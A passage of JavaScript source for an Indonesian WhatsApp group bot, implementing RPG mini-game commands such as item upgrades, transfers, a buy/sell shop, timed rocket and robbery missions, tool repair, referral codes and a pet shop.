${iron < _iron ? `\n${rpg.emoticon('iron')}Iron kamu kurang *${_iron - iron}*` : ''}${wood < ___wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${___wood - wood}*` : ''}${money < ___money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${___money - money}*` : ''}`)
                user.sword += 1
                user.iron -= _iron * 1
                user.wood -= ___wood * 1
                user.money -= ___money * 1
                user.sworddurability = 0 
                user.sworddurability += sword * 50 
                reply(`Succes mengupgrade *${rpg.emoticon('sword')}Sword*`)
                break
                case 'armor':
                if (armor == 0) {
                    let lmao = `anda belum memiliki *${rpg.emoticon('armor')}Armor*
untuk memilikinya ketik *${command}craft armor*`
                    return reply(`${lmao}`)
                }
                if (armor > 9) return reply(`*${rpg.emoticon('armor')}Armor* kamu sudah level max!!`)
                let _diamond = armor * 5
                let ____wood = armor * 150
                let ____money = armor * 1000000
                if (diamond < _diamond || wood < ____wood || money < ____money) return reply(`
Material Anda Kurang!!
${diamond < _diamond ? `\n${rpg.emoticon('diamond')}Diamond kamu kurang *${_diamond - diamond}*` : ''}${wood < ____wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${____wood - wood}*` : ''}${money < ____money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${____money - money}*` : ''}`)
                user.armor += 1
                user.diamond -= _diamond * 1
                user.wood -= ____wood * 1
                user.money -= ____money * 1
                user.armordurability = 0 
                user.armordurability += sword * 50 
                reply(`Succes mengupgrade *${rpg.emoticon('armor')}Armor*`)
                break
                case 'atm':
                if (atm == 0) {
                    let lmao = `anda belum memiliki *${rpg.emoticon('atm')}Atm*
untuk memilikinya ketik *${command}craft atm*`
                    return reply(`${lmao}`)
                }
                if (atm > 999) return reply(`*${rpg.emoticon('atm')}Atm* kamu sudah level max!!`)
                let __diamond = atm * 3
                let _emerald = atm * 5
                let _____money = atm * 10000
                if (diamond < __diamond || emerald < _emerald || money < _____money) return reply(`
Material Anda Kurang!!
${diamond < __diamond ? `\n${rpg.emoticon('diamond')}Diamond kamu kurang *${__diamond - diamond}*` : ''}${emerald < _emerald ? `\n${rpg.emoticon('emerald')}Emerald kamu kurang *${_emerald - emerald}*` : ''}${money < _____money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${_____money - money}*` : ''}`)
                user.atm += 1
                user.diamond -= __diamond * 1
                user.emerald -= _emerald * 1
                user.money -= _____money * 1
                user.fullatm = 0 
                user.fullatm += atm * 500000000
                reply(`Succes mengupgrade *${rpg.emoticon('atm')}Atm*`)
                break
            default :
                return replycraft(`${teks}`)
        }
}
break
//==================================================================
case 'transfer': {
  if (!m.isGroup) return reply(mess.only.group)
function special(type) {
    let b = type.toLowerCase()
    let special = (['common', 'uncommon', 'mythic', 'legendary', 'pet'].includes(b) ? ' Crate' : '')
    return special
}

function isNumber(x) {
    return !isNaN(x)
}
const items = [
    'money', 'bank', 'potion', 'trash', 'wood',
    'rock', 'string', 'petFood', 'emerald',
    'diamond', 'gold', 'iron', 'common',
    'uncommon', 'mythic', 'legendary', 'pet', 'chip', 
    'anggur', 'apel', 'jeruk', 'mangga', 'pisang', 
    'bibitanggur', 'bibitapel', 'bibitjeruk', 'bibitmangga', 'bibitpisang',
]
    let user = global.db.users[m.sender]
    const item = items.filter(v => v in user && typeof user[v] == 'number')
    let lol = `Use format ${command} [type] [value] [number]
Contoh ${command} money 9999 @621927237001

📍 Transferable items
${item.map(v => `${rpg.emoticon(v)}${v}`.trim()).join('\n')}
`.trim()
    const type = (args[0] || '').toLowerCase()
    if (!item.includes(type)) return reply(lol)
    const count = Math.min(Number.MAX_SAFE_INTEGER, Math.max(1, (isNumber(args[1]) ? parseInt(args[1]) : 1))) * 1
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[2] ? (args[2].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
    let _user = global.db.users[who]
    if (!who) return reply('Tag salah satu, atau ketik Nomernya!!')
    if (!(who in global.db.users)) return reply(`User ${who} not in database`)
    if (user[type] * 1 < count) return reply(`Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${count - user[type]}*`)
    let previous = user[type] * 1
    let _previous = _user[type] * 1
    user[type] -= count * 1
    _user[type] += count * 1
    if (previous > user[type] * 1 && _previous < _user[type] * 1) reply(`*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(type)} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
    else {
        user[type] = previous
        _user[type] = _previous
        reply(`*––––––『 TRANSFER 』––––––*\n*📊 Status:* Failted\n*📍 Item:* ${count} ${rpg.emoticon(type)}${type}${special(type)}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
    }
}
break
//==================================================================
case 'buy': {
  if (!m.isGroup) return reply(mess.only.group)
function isNumber(number) {
    if (!number) return number
    number = parseInt(number)
    return typeof number == 'number' && !isNaN(number)
}

function capitalize(word) {
  return word.charAt(0).toUpperCase() + word.substr(1)
}
const items = {
    buy: {
        limit: {
            exp: 9999
        },
        chip: {
        	money: 1000000
        },
        exp: {
        	money: 1000
        },
        potion: {
            money: 1250
        },
        trash: {
            money: 40
        },
        wood: {
            money: 700
        },
        rock: {
            money: 850
        },
        string: {
            money: 400
        },
        iron: { 
        	money: 3000
        },
        diamond: {
            money: 500000
        },
        emerald: {
            money: 100000
        },
        gold: {
            money: 100000
        },
        common: {
            money: 2000
        },
        uncommon: {
            money: 20000
        },
        mythic: {
            money: 75000
        },
        legendary: {
            money: 200000
        },
        petfood: {
            money: 3500
        },
        pet: {
            money: 120000
        },
        anggur: {
            money: 2000
        },
        apel: {
            money: 2000
        },
        jeruk: {
            money: 2000
        },
        mangga: {
            money: 2000
        },
        pisang: {
        	money: 2000
        },
        bibitanggur: {
            money: 2000
        },
        bibitapel: {
            money: 2000
        },
        bibitjeruk: {
            money: 2000
        },
        bibitmangga: {
            money: 2000
        },
        bibitpisang: {
            money: 2000
        },
        umpan: {
        	money: 5000
        }     
    },
    sell: {
        limit: {
            exp: 999
        },
        exp: {
        	money: 1
        },
        chip: {
        	money: 1000000
        },
        potion: {
            money: 625
        },
        trash: {
            money: 20
        },
        wood: {
            money: 350
        },
        rock: {
            money: 425
        },
        string: {
            money: 200
        },
        iron: { 
        	money: 1500
        },
        diamond: {
            money: 250000
        },
        emerald: {
            money: 50000
        },
        gold: {
            money: 50000
        },
        common: {
            money: 1000
        },
        uncommon: {
            money: 10000
        },
        mythic: {
            money: 37500
        },
        legendary: {
            money: 100000
        },
        petfood: {
            money: 1750
        },
        pet: {
            money: 60000
        },
        anggur: {
            money: 1000
        },
        apel: {
            money: 1000
        },
        jeruk: {
            money: 1000
        },
        mangga: {
            money: 1000
        },
        pisang: {
        	money: 1000
        },
        bibitanggur: {
            money: 1000
        },
        bibitapel: {
            money: 1000
        },
        bibitjeruk: {
            money: 1000
        },
        bibitmangga: {
            money: 1000
        },
        bibitpisang: {
            money: 1000
        },
        umpan: {
        	money: 2500
        }
    }
}

    const item = (args[0] || '').toLowerCase()
    if (!item.match('limit') && db.chats[m.chat].rpg == false && m.isGroup) return dfail('rpg', m, RyuuBotz)
    let user = db.users[m.sender]
    const listItems = Object.fromEntries(Object.entries(items[command.toLowerCase()]).filter(([v]) => v && v in user))
    let text = ''
    let footer = ''
    let image = ''
    let buttons = ''
    text = (command.toLowerCase() == 'buy' ?
(`
*${decor.htki} 𝙱𝚄𝚈𝙸𝙽𝙶 ${decor.htka}*
`.trim()) : 
(`
*${decor.htki} 𝚂𝙴𝙻𝙻𝙸𝙽𝙶 ${decor.htka}*
`.trim())
)
    footer = (command.toLowerCase() == 'buy' ?
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim()) : 
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ sᴇʟʟ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim())
)
    
    const total = Math.floor(isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 1), Number.MAX_SAFE_INTEGER) : 1) * 1
    if (!listItems[item]) return reply(footer)
    if (command.toLowerCase() == 'buy') {
        let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
        if (user[paymentMethod] < listItems[item][paymentMethod] * total) return reply(`Kamu membutuhkan *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Lagi, Untuk Membeli *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. Kamu hanya memiliki *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
        user[paymentMethod] -= listItems[item][paymentMethod] * total
        user[item] += total
        return reply(`Sukses Membeli *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
    } else {
    	let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
        if (user[item] < total) return reply(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
        user[item] -= total
        user[paymentMethot] += listItems[item][paymentMethot] * total
        return reply(`Sukses Menjual *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
    }
}
break
//==================================================================
case 'selectskill': {
  if (!m.isGroup) return reply(mess.only.group)
let user = global.db.users[m.sender]
let skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
let bintang = {
"satu": "⭐",
"dua": "⭐⭐",
"tiga": "⭐⭐⭐",
"empat": "⭐⭐⭐⭐",
"lima": "⭐⭐⭐⭐⭐",
"Enam": "⭐⭐⭐⭐⭐⭐"
}
   let skil = text.trim().toLowerCase() // to filter text
   if (!skill.includes(skil)) return reply( `Select *skill🃏* what do you want/pilih skill apa yg kamu inginkan:

${skill.map(skil => `› ${skil}`).join('\n')}

How To use/Cara menggunakan:
${command} <nameskill>
     
Contoh/Contoh:
${command} necromancer
`)
    if (user.skill == "") {
        user.skill = skil
        reply(`Anda telah memilih Skill ${skil}`)
    } else if (user.skill) {
        reply(`Anda Sudah Punya skill ${user.skill} Tidak bisa diganti`)
    }
}
break
//==================================================================
case 'sampah': {
  if (!m.isGroup) return reply(mess.only.group)
const rewards = {
    exp: 500,
    money: 20999,
}

const cooldown = 2592000000
    let user = global.db.users[m.sender]
    if (new Date - user.lastmonthly < cooldown) return reply( `You have already claimed this monthly claim, wait for *${((user.lastmonthly + cooldown) - new Date()).toTimeString()}*`.trim())
    let text = ''
    for (let reward of Object.keys(rewards)) if (reward in user) {
        user[reward] += rewards[reward]
        text += `*+${rewards[reward]}* ${rpg.emoticon(reward)}${reward}\n`
    }
    reply('*––––––『 NYAMPAH 』––––––*\n' + text.trim())
    user.lastmonthly = new Date * 1
}
break

//==================================================================
case 'roket': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let user = global.db.users[m.sender]
    let order = global.db.users[m.sender].rokets
    let timers = clockString(_timers)
    let name = user.registered ? user.name: RyuuBotz.getName(m.sender)
    let id = m.sender
    let kerja = 'Roket'
    RyuuBotz.misi = RyuuBotz.misi ? RyuuBotz.misi: {}
    if (id in RyuuBotz.misi) {
        reply( `Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (user.health < 80) return reply(`Anda Harus Memiliki Minimal 80Health`)
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let ngerok4 = Math.floor(Math.random() * 10)
        let ngerok5 = Math.floor(Math.random() * 10)

        let ngrk4 = (ngerok4 * 100000)
        let ngrk5 = (ngerok5 * 1000)

        let rokit = `🌕


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████
🚀

👨‍🚀 Memulai penerbangan....
`.trim()

        let rokit2 = `🌕


🚀
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Dalam penerbangan....
`.trim()

        let rokit3 = `🌕🚀


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Sampai di tujuan....
`.trim()

        let rokit4 = `🌕🚀

➕ Sukses Mendarat.... 👨‍🚀
`.trim()

        let hsl = `
*—[ Hasil Ngroket ${name} ]—*
➕ 💹 Uang = [ ${ngrk4} ]
➕ ✨ Exp = [ ${ngrk5} ]
➕ 😍 Mendarat Selesai = +1
➕  📥Total Mendarat Sebelumnya : ${order}
`.trim()

        user.money += ngrk4
        user.exp += ngrk5
        user.rokets += 1
        user.health -= 80

		RyuuBotz.misi[id] = [
            kerja,
            setTimeout(() => {
                delete RyuuBotz.misi[id]
            }, 27000)
        ]
        
        setTimeout(() => {
            reply( hsl)
        }, 27000)

        setTimeout(() => {
            reply( rokit4)
        }, 25000)

        setTimeout(() => {
            reply( rokit3)
        }, 20000)

        setTimeout(() => {
            reply( rokit2)
        }, 15000)

        setTimeout(() => {
            reply( rokit)
        }, 10000)

        setTimeout(() => {
            reply( `🔍 ${name} Mencari Lokasi.....`)
        }, 0)
        user.lastmisi = new Date * 1
    } else reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
    }
    break
//==================================================================
case 'rob':
case 'robery': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let user = global.db.users[m.sender]
    let __timers = (new Date - user.lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers)
    let id = m.sender
    let kerja = 'Rob'
    RyuuBotz.misi = RyuuBotz.misi ? RyuuBotz.misi : {}
    if (id in RyuuBotz.misi) {
        reply( `Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (user.health < 80) return reply('Anda Harus Memiliki Minimal 80Health')
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let rndm1 = Math.floor(Math.random() * 10)
        let rndm2 = Math.floor(Math.random() * 10)
        
        let ran1 = (rndm1 * 100000)
        let ran2 = (rndm2 * 1000)

        let jln = `
🏘️          🚗

✔️ Mengincar target....
`.trim()

        let jln2 = `
🏘️     🚶

➕ Memulai aksi....
`.trim()

        let jln3 = `
🏘️

➕ Merampok....
`.trim()

        let jln4 = `
🚗



🏘️🚓

➕ 💹Berhasil kabur....
`.trim()

        let hsl = `
*—[ Hasil rob ]—*

➕ 💹 Uang = [ ${ran1} ]
➕ ✨ Exp = [ ${ran2} ]
➕ 📦 Rob Selesai = +1

Dan health anda berkurang -80
`.trim()
        user.money += ran1
        user.exp += ran2
        user.health -= 80

		RyuuBotz.misi[id] = [
        kerja,
        setTimeout(() => {
            delete RyuuBotz.misi[id]
        }, 27000)
    	]
    
        setTimeout(() => {
            reply(hsl)
        }, 27000)

        setTimeout(() => {
            reply(jln4)
        }, 25000)

        setTimeout(() => {
            reply(jln3)
        }, 20000)

        setTimeout(() => {
            reply(jln2)
        }, 15000)

        setTimeout(() => {
            reply(jln)
        }, 10000)

        setTimeout(() => {
            reply('🔍Mencari Rumah.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
    }
    break
//==================================================================
case 'repair': {
if (!m.isGroup) return reply(mess.only.group)
const {default: MessageType } = require ('@whiskeysockets/baileys')

  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  global.db.users[m.sender].pickaxe = global.db.users[m.sender].pickaxe || 0
  global.db.users[m.sender].sword = global.db.users[m.sender].sword || 0
  global.db.users[m.sender].fishingrod = global.db.users[m.sender].fishingrod || 0
  global.db.users[m.sender].armor = global.db.users[m.sender].armor || 0
  let botol = global.botwm

let lgocraft = `
*「 R E P A I R」*`

  let caption = `
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼

*❏ RECIPE*
▧ Pickaxe ⛏️
〉  20 Rock
〉 20 Wood
〉 20 Iron
〉 1 Diamond

▧ Sword ⚔️
〉 20 Wood
〉 20 Iron
〉 2 Gold
〉 1 Diamond

▧ FishingRod ⚔️
〉 20 Wood
〉 20 String
〉 20 Iron
〉 1 Diamond

▧ Armor 🥼
〉 15 Iron
〉 2 Gold
〉 1 Diamond
`
const sections = [
   {
	title: "REPAIR A TOOLS",
	rows: [
	    {title: "SWORD ⚔️", rowId: ".repair sword", description: "Repair Sword"},
	    {title: "PICKAXE ⛏️", rowId: ".repair pickaxe", description: "Repair Pickaxe"},
	    {title: "FISHINGROD 🥼", rowId: ".repair fishingrod", description: "Repair FishingRod"},
	    {title: "ARMOR 🥼", rowId: ".repair armor", description: "Repair Armor"},
	]
    },
]

const listMessage = {
  text: caption,
  footer: wm,
  title: lgocraft,
  buttonText: "R E P A I R",
  sections
}

  try {
    if (/repair/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'pickaxe':
          if (user.pickaxedurability > 99) return reply('Tools ini belum memiliki kerusakan')
          if (user.pickaxe == 0) return reply('Kamu belum memilik ini')
            if(user.diamond < 1 || user.rock < 20 || user.wood < 20 || user.iron < 20 ) return reply(`Barang tidak cukup!`)
             user.rock -= 20
             user.wood -= 20
             user.iron -= 20
             user.diamond -= 1
             user.pickaxedurability = 100
            reply("Sukses memperbaiki!")
            break
          case 'sword':
          if (user.sworddurability > 99) return reply('Tools ini belum memiliki kerusakan')
          if (user.sword == 0) return reply('Kamu belum memilik ini')
            if(user.diamond < 1 || user.wood < 20 || user.iron < 20 || user.gold < 2 ) return reply(`Barang tidak cukup!`)
             user.wood -= 20
             user.iron -= 20
             user.gold -= 3
             user.diamond -= 1
             user.sworddurability = 100
            reply("Sukses memperbaiki!")
            break
            case 'fishingrod':
          if (user.fishingroddurability > 99) return reply('Tools ini belum memiliki kerusakan')
          if (user.fishingrod == 0) return reply('Kamu belum memiliki ini')
            if(user.diamond < 1 || user.string < 20 || user.wood < 20 || user.iron < 20 ) return reply(`Barang tidak cukup!`)
             user.wood -= 20
             user.string -= 20
             user.iron -= 20
             user.diamond -= 1
             user.fishingroddurability = 100
            reply("Sukses memperbaiki!")
            break
            case 'armor':
          if (user.armordurability > 99) return reply('Tools ini belum memiliki kerusakan')
          if (user.armor == 0) return reply('Kamu belum memilik ini')
            if(user.diamond < 1 || user.iron < 15 || user.gold < 2 ) return reply(`Barang tidak cukup!`)
             user.iron -= 15
             user.gold -= 2
             user.diamond -= 1
             user.armordurability = 100
            reply("Sukses memperbaiki!")
            break
          default:
            return await RyuuBotz.sendMessage(m.chat, listMessage)
        }
    } else if (/enchant|enchan/i.test(command)) {
      const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
      switch (_type) {
        case 't':
          break
        case '':
          break

        default:
          return RyuuBotz.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
      }
    }
  } catch (err) {
    reply("Error\n\n\n" + err.stack)
  }
}
break
//==================================================================
case 'referal': {
  if (!m.isGroup) return reply(mess.only.group)
const { crypto } = require ("crypto")
const xp_first_time = 2500
const xp_link_creator = 15000
const xp_bonus = {
    5: 40000,
   10: 100000,
   20: 250000,
   50: 1000000,
  100: 10000000,
}

  let users = global.db.users
  if (text) {
    if ('ref_count' in users[m.sender]) throw 'Tidak bisa menggunakan kode referal!'
    let link_creator = (Object.entries(users).find(([, { ref_code }]) => ref_code === text.trim()) || [])[0]
    if (!link_creator) throw 'Kode referal tidak valid'
    let count = users[link_creator].ref_count++
    let extra = xp_bonus[count] || 0
    users[link_creator].exp += xp_link_creator + extra
    users[m.sender].exp += xp_first_time
    users[m.sender].ref_count = 0
    reply(`
Selamat!
+${xp_first_time} XP
`.trim())
    reply(`
Seseorang telah menggunakan kode referal kamu
+${xp_link_creator + extra} XP
`.trim(), link_creator)
  } else {
    let code = users[m.sender].ref_code = users[m.sender].ref_code || new Array(11).fill().map(() => [...'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'][crypto.randomInt(62)]).join('')
    users[m.sender].ref_count = users[m.sender].ref_count ? users[m.sender].ref_count : 0
    let command_text = `${command}ref ${code}`
    let command_link = `wa.me/${RyuuBotzuser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
    let share_text = `
Dapatkan ${xp_first_time} XP untuk yang menggunakan link/kode referal dibawah ini

Referal Code: *${code}*

${command_link}
`.trim()
    reply(`
Dapatkan ${xp_link_creator} XP untuk setiap pengguna baru yang menggunakan kode referal kamu
${users[m.sender].ref_count} orang telah menggunakan kode referal kamu

Kode referal kamu: ${code}

Bagikan link kepada teman: ${command_link}

atau kirim pesan kepada teman wa.me/?text=${encodeURIComponent(share_text)}

${Object.entries(xp_bonus).map(([count, xp]) => `${count} Orang = Bonus ${xp} XP`).join('\n')}
`.trim())
  }
}
break
//==================================================================
case 'petstore': 
case 'petshop': {
  if (!m.isGroup) return reply(mess.only.group)
  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  global.db.users[m.sender].pickaxe = global.db.users[m.sender].pickaxe || 0
  global.db.users[m.sender].pedang = global.db.users[m.sender].pedang || 0
  global.db.users[m.sender].fishingrod = global.db.users[m.sender].fishingrod || 0
  
  //----------HARGA
  let hdog = 2
  let hcat = 2
  let hhorse = 4
  let hfox = 6
  let hrobo = 10
  
  let hlion = 10
  let hrhinoceros = 10
  let hdragon = 10
  let hcentaur = 10
  let hkyubi = 10
  let hgriffin = 10
  let hphonix = 10
  let hwolf = 10

let logo = `— *P E T   S T O R E* —
▮▧▧▧▧▧▧▧▧▧▧▧▧▮`
let caption = `
🐈 *Cat:* ${hcat} 🔖
🐕 *Dog:* ${hdog} 🔖
🐎 *Horse:* ${hhorse} 🔖
🦊 *Fox:* ${hfox} 🔖
🤖 *Robo:* ${hrobo} 🔖

〉 *ABILITY*
Cooming soon...`
const sections = [
   {
	title: "Buy A Pet",
	rows: [
	    {title: "Cat 🐈", rowId: ".petshop cat", description: "Adopt A Cat"},
	    {title: "Dog 🐕", rowId: ".petshop dog", description: "Adopt A Dog"},
	    {title: "Horse 🐎", rowId: ".petshop horse", description: "Adopt A Horse"},
	    {title: "Fox 🦊", rowId: ".petshop fox", description: "Adopt A Fox"},
	    {title: "Robo 🤖", rowId: ".petshop robo", description: "Buy A Robo"},
	]
    },
]

const listMessage = {
  text: caption,
  footer: wm,
  title: logo,
  buttonText: "ADOPT ME 🐾",
  sections
}

  try {
    if (/petshop/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'cat':
          if (user.cat > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hcat) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hcat
            global.db.users[m.sender].cat += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
          case 'dog':
          if (user.dog > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hdog) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hdog
            global.db.users[m.sender].dog += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
          case 'fox':
          if (user.fox > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hfox) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hfox
            global.db.users[m.sender].fox += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
          case 'horse':
          if (user.horse > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hhorse) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hhorse
            global.db.users[m.sender].horse += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
          case 'robo':
          if (user.robo > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hrobo) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hrobo
            global.db.users[m.sender].robo += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'lion':
          if (user.lion > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hlion) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hlion
            global.db.users[m.sender].lion += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'rhinoceros':
          if (user.rhinoceros > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hrhinoceros) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hrhinoceros
            global.db.users[m.sender].rhinoceros += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'dragon':
          if (user.dragon > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hdragon) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hdragon
            global.db.users[m.sender].dragon += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'centaur':
          if (user.centaur > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hcentaur) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hcentaur
            global.db.users[m.sender].centaur += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'kyubi':
          if (user.kyubi > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hkyubi) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hkyubi
            global.db.users[m.sender].kyubi += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'griffin':
          if (user.griffin > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hgriffin) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hgriffin
            global.db.users[m.sender].griffin += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'phonix':
          if (user.phonix > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hphonix) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hphonix
            global.db.users[m.sender].phonix += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            case 'wolf':
          if (user.wolf > 0) return reply('Kamu sudah memilik ini')
            if(user.pet < hwolf) return reply(`Pet Token anda kurang`)
            global.db.users[m.sender].pet -= hwolf
            global.db.users[m.sender].wolf += 1
            reply("Selamat anda mempunyai pet Baru ! 🎉")
            break
            
          default:
              return await reply(`${logo}\n${caption}`)
            //return await RyuuBotz.sendMessage(m.chat, listMessage)
        }
    } else if (/enchant|enchan/i.test(command)) {
      const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
      switch (_type) {
        case 't':
          break
        case '':
          break

        default:
          return RyuuBotz.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
      }
    }
  } catch (err) {
    reply("Error\n\n\n" + err.stack)
  }
  }
  break
//==================================================================
case 'kolam': {
  if (!m.isGroup) return reply(mess.only.group)
let user = global.db.users[m.sender]
let past = `
╭━━━━「 *BIO* 」   
